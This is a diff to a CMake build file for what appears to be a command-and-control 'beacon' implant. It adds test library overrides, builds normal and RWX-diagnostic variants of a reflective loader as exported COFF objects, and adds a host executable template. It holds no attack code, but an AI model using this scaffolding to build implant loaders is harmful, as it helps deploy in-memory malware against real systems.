@@ -64,10 +64,20 @@ set(BEACON_SYS_LIBS
   winhttp
 )
 
+set(BEACON_LIB_DIR "${CMAKE_SOURCE_DIR}/lib" CACHE PATH
+  "Directory with tomcrypt.x64.lib / tommath.x64.lib (tests may override)")
+set(BEACON_TEST_EXTRA_DEFS "" CACHE STRING
+  "Extra preprocessor defs for beacon_tests (e.g. BEACON_TEST_ENABLE_KEYGEN)")
+
 set(BEACON_TOMCRYPT "${CMAKE_SOURCE_DIR}/lib/tomcrypt.x64.lib")
 set(BEACON_TOMMATH  "${CMAKE_SOURCE_DIR}/lib/tommath.x64.lib")
+set(BEACON_TEST_TOMCRYPT "${BEACON_LIB_DIR}/tomcrypt.x64.lib")
+set(BEACON_TEST_TOMMATH  "${BEACON_LIB_DIR}/tommath.x64.lib")
 if(NOT EXISTS "${BEACON_TOMCRYPT}" OR NOT EXISTS "${BEACON_TOMMATH}")
   message(FATAL_ERROR "Vendored libs missing under lib/")
+endif()
+if(NOT EXISTS "${BEACON_TEST_TOMCRYPT}" OR NOT EXISTS "${BEACON_TEST_TOMMATH}")
+  message(FATAL_ERROR "Test libs missing under BEACON_LIB_DIR=${BEACON_LIB_DIR}")
 endif()
 
 function(add_beacon_dll target_name output_name sources extra_defs)
@@ -141,10 +151,13 @@ target_compile_definitions(beacon_tests PRIVATE
   USE_LTM
   BW_TRACE_ENABLE)
 target_compile_options(beacon_tests PRIVATE /W3 /EHsc)
-target_link_directories(beacon_tests PRIVATE "${CMAKE_SOURCE_DIR}")
+target_link_directories(beacon_tests PRIVATE "${CMAKE_SOURCE_DIR}" "${BEACON_LIB_DIR}")
 target_link_libraries(beacon_tests PRIVATE
   ws2_32 advapi32
-  "${BEACON_TOMCRYPT}" "${BEACON_TOMMATH}")
+  "${BEACON_TEST_TOMCRYPT}" "${BEACON_TEST_TOMMATH}")
+if(BEACON_TEST_EXTRA_DEFS)
+  target_compile_definitions(beacon_tests PRIVATE ${BEACON_TEST_EXTRA_DEFS})
+endif()
 set_target_properties(beacon_tests PROPERTIES OUTPUT_NAME tests)
 
 add_executable(load_smoke tests/load_smoke.cpp)
@@ -152,11 +165,43 @@ target_compile_options(load_smoke PRIVATE /W3 /EHsc)
 target_link_libraries(load_smoke PRIVATE kernel32)
 add_dependencies(load_smoke beacon_wininet)
 
-# UDRL COFF object (user-mode loader). /Zl so the .obj has no defaultlib.
-add_library(udrl OBJECT udrl/ReflectiveLoader.c)
-target_include_directories(udrl PRIVATE "${CMAKE_SOURCE_DIR}/udrl" "${CMAKE_SOURCE_DIR}/src")
-target_compile_definitions(udrl PRIVATE BW_UDRL_USER_DATA_DELIVER=1 BW_LOADER_PRIVATE=1)
-target_compile_options(udrl PRIVATE /W3 /O2 /GS- /Zl /nologo)
+# UDRL COFF objects (user-mode loader). /Zl so the .obj has no defaultlib.
+function(add_udrl_obj target_name extra_defs)
+  add_library(${target_name} OBJECT udrl/ReflectiveLoader.c)
+  target_include_directories(${target_name} PRIVATE
+    "${CMAKE_SOURCE_DIR}/udrl" "${CMAKE_SOURCE_DIR}/src")
+  target_compile_definitions(${target_name} PRIVATE
+    BW_UDRL_USER_DATA_DELIVER=1 BW_LOADER_PRIVATE=1 ${extra_defs})
+  target_compile_options(${target_name} PRIVATE /W3 /O2 /GS- /Zl /Gy- /nologo)
+endfunction()
+add_udrl_obj(udrl     "")
+add_udrl_obj(udrl_rwx "BW_DIAG_RWX")
+
+add_custom_target(udrl_export ALL
+  COMMAND ${CMAKE_COMMAND} -E make_directory "${BEACON_OUT}"
+  COMMAND ${CMAKE_COMMAND} -E copy_if_different
+          "$<TARGET_OBJECTS:udrl>"
+          "${BEACON_OUT}/ReflectiveLoader.x64.obj"
+  COMMAND ${CMAKE_COMMAND} -E copy_if_different
+          "$<TARGET_OBJECTS:udrl_rwx>"
+          "${BEACON_OUT}/ReflectiveLoader.rwx.x64.obj"
+  DEPENDS udrl udrl_rwx
+  COMMENT "export UDRL COFF objects"
+  VERBATIM)
+
+# Host EXE template (former build.yml cl/link of udrl/hostexe.c).
+add_executable(host_template WIN32 udrl/hostexe.c)
+target_compile_options(host_template PRIVATE /W3 /O1 /GS- /nologo)
+target_link_libraries(host_template PRIVATE kernel32)
+target_link_options(host_template PRIVATE
+  /NOLOGO
+  /ENTRY:bw_entry
+  /MACHINE:X64
+  /STACK:16777216
+  /DYNAMICBASE
+  /NXCOMPAT)
+set_target_properties(host_template PROPERTIES
+  OUTPUT_NAME host_template_x64)
 
 enable_testing()
 add_test(NAME host_unit COMMAND beacon_tests)
